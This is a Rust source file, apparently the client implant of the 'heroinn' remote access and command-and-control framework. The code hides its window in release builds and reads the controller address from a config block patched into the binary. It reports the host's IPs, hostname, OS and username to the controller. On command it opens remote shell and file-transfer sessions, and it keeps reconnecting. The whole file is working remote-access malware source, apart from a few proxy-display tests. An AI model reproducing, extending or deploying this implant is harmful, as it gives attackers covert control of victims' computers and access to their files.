#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
use heroinn_util::{
    HEART_BEAT_TIME, HeroinnClientMsgID, HeroinnProtocol, HeroinnServerCommandID, SlaveDNA,
    cur_timestamp_secs,
    dna::{CLIENT_CAPABILITY_MARKER, CONNECTION_INFO_FLAG},
    packet::{Heartbeat, HostInfo, Message, ProxyDisplay},
    protocol::{RouteReport, Transport, TransportFactory},
    session::{ClientSession, SessionBase, SessionManager},
};
use std::{
    str::FromStr,
    sync::{Arc, Mutex, mpsc::channel},
    time::Duration,
};
use systemstat::{Ipv4Addr, Platform, System};
use uuid::Uuid;

mod config;
mod diagnostics;
mod module;

use module::{shell::ShellClient, transfer};

use crate::{config::master_configure, module::ftp::FtpClient};

#[used]
static G_CONNECTION_INFO: SlaveDNA = SlaveDNA {
    flag: CONNECTION_INFO_FLAG,
    size: [0u8; 8],
    data: [0u8; 1024],
};

#[used]
#[unsafe(no_mangle)]
static HEROINN_CLIENT_CAPABILITIES: [u8; CLIENT_CAPABILITY_MARKER.len()] = CLIENT_CAPABILITY_MARKER;

fn display_proxy_endpoint(endpoint: &str, source: Option<String>) -> ProxyDisplay {
    let (protocol, address) = endpoint
        .split_once("://")
        .map(|(protocol, address)| (protocol.to_ascii_uppercase(), address.to_string()))
        .unwrap_or_else(|| (endpoint.to_ascii_uppercase(), String::new()));
    ProxyDisplay {
        protocol,
        address,
        source,
    }
}

fn system_proxy_display(route: &RouteReport) -> ProxyDisplay {
    let source = route.system_source.map(|source| source.to_string());
    if let Some(endpoint) = &route.system_proxy {
        return display_proxy_endpoint(endpoint, source);
    }
    ProxyDisplay {
        protocol: if route.system_bypassed {
            "Bypassed".to_string()
        } else {
            "None".to_string()
        },
        address: String::new(),
        source,
    }
}

fn socks5_proxy_display(route: &RouteReport) -> ProxyDisplay {
    match &route.socks5_proxy {
        Some(endpoint) => display_proxy_endpoint(endpoint, Some("specified".to_string())),
        None => ProxyDisplay {
            protocol: "Disabled".to_string(),
            address: String::new(),
            source: None,
        },
    }
}

fn main() {
    let _ = diagnostics::init_logging();
    log::info!("heroinn_client starting");

    let clientid = Uuid::new_v4().to_string();

    let shell_session_mgr: SessionManager<ShellClient> = SessionManager::new();
    let shell_session_mgr = Arc::new(Mutex::new(shell_session_mgr));

    let ftp_session_mgr: SessionManager<FtpClient> = SessionManager::new();
    let ftp_session_mgr = Arc::new(Mutex::new(ftp_session_mgr));

    let shell_session_mgr_1 = shell_session_mgr.clone();
    let ftp_session_mgr_1 = ftp_session_mgr.clone();
    std::thread::spawn(move || {
        loop {
            std::thread::sleep(Duration::from_secs(HEART_BEAT_TIME));
            let mut shell_session = shell_session_mgr_1.lock().unwrap();
            let mut ftp_session = ftp_session_mgr_1.lock().unwrap();

            log::info!("shell session : {}", shell_session.count());
            log::info!("ftp session : {}", ftp_session.count());

            shell_session.gc();
            ftp_session.gc();
        }
    });

    let config = master_configure();
    let transport_factory =
        match TransportFactory::system_with_specified_socks5(config.socks5_proxy.as_ref()) {
            Ok(factory) => Arc::new(factory),
            Err(error) => {
                diagnostics::report_connect_failure(&error);
                return;
            }
        };

    loop {
        shell_session_mgr.lock().unwrap().close_all();
        ftp_session_mgr.lock().unwrap().close_all();

        let (session_sender, session_receiver) = channel::<SessionBase>();

        let proto = match HeroinnProtocol::try_from(config.protocol) {
            Ok(p) => p,
            Err(e) => {
                log::error!("unknown protocol {} : {}", config.protocol, e);
                std::process::exit(0);
            }
        };

        log::info!(
            "connecting protocol={} target={}",
            config.protocol,
            config.address
        );
        let mut client =
            match Transport::connect_with_factory(&transport_factory, &proto, &config.address) {
                Ok(p) => p,
                Err(e) => {
                    diagnostics::report_connect_failure(&e);
                    std::thread::sleep(Duration::from_secs(5));
                    continue;
                }
            };

        log::info!("connect success!");
        let route_report = client.route_report().cloned().unwrap_or_default();

        let hostname = whoami::hostname().unwrap_or_else(|_| "UNKNOWN".to_string());

        let sys = System::new();
        let ips = match sys.networks() {
            Ok(netifs) => {
                let mut ret = String::new();
                for netif in netifs.values() {
                    for i in &netif.addrs {
                        if let systemstat::IpAddr::V4(p) = i.addr {
                            if p == Ipv4Addr::from_str("127.0.0.1").unwrap() {
                                continue;
                            }
                            ret += &format!("{},", p);
                        }
                    }
                }
                ret
            }
            Err(_) => "UNKNOW".to_string(),
        };

        let info = os_info::get();
        let os = format!("{} {} {}", info.os_type(), info.bitness(), info.version());

        let hostinfo = HostInfo {
            ip: ips,
            host_name: hostname,
            os,
            whoami: whoami::username().unwrap_or_else(|_| "UNKNOWN".to_string()),
            remark: config.remark.clone(),
            system_proxy: Some(system_proxy_display(&route_report)),
            socks5_proxy: Some(socks5_proxy_display(&route_report)),
        };

        let buf = match Message::build(HeroinnClientMsgID::HostInfo.to_u8(), &clientid, hostinfo) {
            Ok(p) => p,
            Err(e) => {
                log::error!("make HostInfo packet failed : {}", e);
                client.close();
                continue;
            }
        };

        if let Err(e) = transfer::send(&mut client, &buf) {
            diagnostics::report_data_plane_failure(
                "main_connection_send_host_info",
                client.proxy_context(),
                &e,
            );
            client.close();
            continue;
        };

        let (sender, receriver) = channel::<Vec<u8>>();

        let mut client_1 = client.clone();
        std::thread::spawn(move || {
            loop {
                let buf = match receriver.recv() {
                    Ok(p) => p,
                    Err(e) => {
                        log::info!("sender channel closed : {}", e);
                        break;
                    }
                };

                if let Err(e) = transfer::send(&mut client_1, &buf) {
                    diagnostics::report_data_plane_failure(
                        "main_connection_send",
                        client_1.proxy_context(),
                        &e,
                    );
                    client_1.close();
                    break;
                };
                log::info!("id : {} send [{}] bytes", buf[0], buf.len());
            }
        });

        let mut client_2 = client.clone();
        let clientid_1 = clientid.clone();
        let sender_1 = sender.clone();
        std::thread::spawn(move || {
            loop {
                // Flush the in/out transfer rates accumulated since the last beat.
                let (in_rate, out_rate) = transfer::take_rates();

                let heartbeat = Heartbeat {
                    time: cur_timestamp_secs(),
                    in_rate,
                    out_rate,
                };
                log::info!("inrate : {} , outrate : {}", in_rate, out_rate);
                let buf = match Message::build(
                    HeroinnClientMsgID::Heartbeat.to_u8(),
                    &clientid_1,
                    heartbeat,
                ) {
                    Ok(p) => p,
                    Err(e) => {
                        log::error!("make Heartbeat packet failed : {}", e);
                        break;
                    }
                };

                if let Err(e) = sender_1.send(buf) {
                    log::error!("send Heartbeat packet to channel failed : {}", e);
                    break;
                };

                std::thread::sleep(Duration::from_secs(HEART_BEAT_TIME));
            }
            client_2.close();
        });

        std::thread::spawn(move || {
            loop {
                let base = match session_receiver.recv() {
                    Ok(p) => p,
                    Err(e) => {
                        log::info!("session receiver channel closed : {}", e);
                        break;
                    }
                };

                let Ok(buf) = Message::build(
                    HeroinnClientMsgID::SessionPacket.to_u8(),
                    &base.clientid,
                    base.packet,
                ) else {
                    continue;
                };

                if let Err(e) = sender.send(buf) {
                    log::info!("session receiver closed : {}", e);
                    break;
                };
            }
        });

        loop {
            let buf = match transfer::recv(&mut client) {
                Ok(buf) => buf,
                Err(e) => {
                    diagnostics::report_data_plane_failure(
                        "main_connection_recv",
                        client.proxy_context(),
                        &e,
                    );
                    client.close();
                    break;
                }
            };
            log::info!("recv [{}] bytes", buf.len());

            let command = buf
                .first()
                .and_then(|id| HeroinnServerCommandID::try_from(*id).ok());

            let local_addr = match client.local_addr() {
                Ok(address) => address,
                Err(e) => {
                    diagnostics::report_data_plane_failure(
                        "main_connection_local_addr",
                        client.proxy_context(),
                        &e,
                    );
                    client.close();
                    break;
                }
            };
            let msg = match Message::new(local_addr, proto.clone(), &buf) {
                Ok(p) => p,
                Err(e) => {
                    log::error!("decode server command failed : {}", e);
                    continue;
                }
            };

            match command {
                Some(HeroinnServerCommandID::Shell) => {
                    log::debug!("create shell session");
                    let id = match msg.parse_sessionpacket() {
                        Ok(p) => p.id,
                        Err(e) => {
                            log::error!("create shell session failed : {}", e);
                            continue;
                        }
                    };

                    match ShellClient::new_client(session_sender.clone(), &clientid, &id) {
                        Ok(session) => shell_session_mgr.lock().unwrap().register(session),
                        Err(e) => log::error!("create shell session failed : {}", e),
                    }
                }
                Some(HeroinnServerCommandID::File) => {
                    let id = match msg.parse_sessionpacket() {
                        Ok(packet) => packet.id,
                        Err(e) => {
                            log::error!("create ftp session failed : {}", e);
                            continue;
                        }
                    };

                    match FtpClient::new_client_with_factory(
                        session_sender.clone(),
                        &clientid,
                        &id,
                        transport_factory.clone(),
                    ) {
                        Ok(session) => ftp_session_mgr.lock().unwrap().register(session),
                        Err(e) => log::error!("create ftp session failed : {}", e),
                    }
                }
                Some(HeroinnServerCommandID::SessionPacket) => {
                    let packet = match msg.parse_sessionpacket() {
                        Ok(packet) => packet,
                        Err(e) => {
                            log::error!("decode session packet failed : {}", e);
                            continue;
                        }
                    };

                    log::info!("recv session packet [{}] [{}]", packet.id, msg.length());

                    let shell_result = {
                        shell_session_mgr
                            .lock()
                            .unwrap()
                            .write(&packet.id, &packet.data)
                    };
                    if let Err(e) = shell_result {
                        diagnostics::report_data_plane_failure(
                            "shell_session_write",
                            client.proxy_context(),
                            &e,
                        );
                        shell_session_mgr.lock().unwrap().close(&packet.id);
                    }
                    let ftp_result = {
                        ftp_session_mgr
                            .lock()
                            .unwrap()
                            .write(&packet.id, &packet.data)
                    };
                    if let Err(e) = ftp_result {
                        diagnostics::report_data_plane_failure(
                            "ftp_session_write",
                            client.proxy_context(),
                            &e,
                        );
                        ftp_session_mgr.lock().unwrap().close(&packet.id);
                    }
                }
                Some(HeroinnServerCommandID::SetTransferRate) => {
                    let setting = match msg.parse_transfer_rate() {
                        Ok(p) => p,
                        Err(e) => {
                            log::error!("decode transfer rate setting failed : {}", e);
                            continue;
                        }
                    };

                    match transfer::set_rate(setting.bytes_per_sec) {
                        Ok(_) => log::info!(
                            "aggregate transfer rate limited to {} bytes/s (effective {})",
                            setting.bytes_per_sec,
                            transfer::current_rate()
                        ),
                        Err(e) => log::error!("apply transfer rate setting failed : {}", e),
                    }
                }
                None => {}
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use heroinn_util::protocol::proxy::ProxySource;

    #[test]
    fn route_displays_distinguish_none_bypassed_and_two_layer_routes() {
        let direct = RouteReport::default();
        assert_eq!(system_proxy_display(&direct).protocol, "None");
        assert_eq!(socks5_proxy_display(&direct).protocol, "Disabled");

        let bypassed = RouteReport {
            system_bypassed: true,
            system_source: Some(ProxySource::Environment),
            socks5_proxy: Some("socks5://[::1]:1080".to_string()),
            ..RouteReport::default()
        };
        assert_eq!(system_proxy_display(&bypassed).protocol, "Bypassed");
        let specified = socks5_proxy_display(&bypassed);
        assert_eq!(specified.protocol, "SOCKS5");
        assert_eq!(specified.address, "[::1]:1080");

        let chained = RouteReport {
            system_proxy: Some("https://proxy.example:8443".to_string()),
            system_source: Some(ProxySource::System),
            socks5_proxy: Some("socks5://127.0.0.1:1080".to_string()),
            ..RouteReport::default()
        };
        assert_eq!(system_proxy_display(&chained).protocol, "HTTPS");
        assert_eq!(system_proxy_display(&chained).address, "proxy.example:8443");
        assert_eq!(socks5_proxy_display(&chained).protocol, "SOCKS5");
    }

    #[test]
    fn evidence_marker_is_present_in_the_client_image() {
        assert_eq!(
            HEROINN_CLIENT_CAPABILITIES,
            heroinn_util::dna::CLIENT_CAPABILITY_MARKER
        );
    }
}
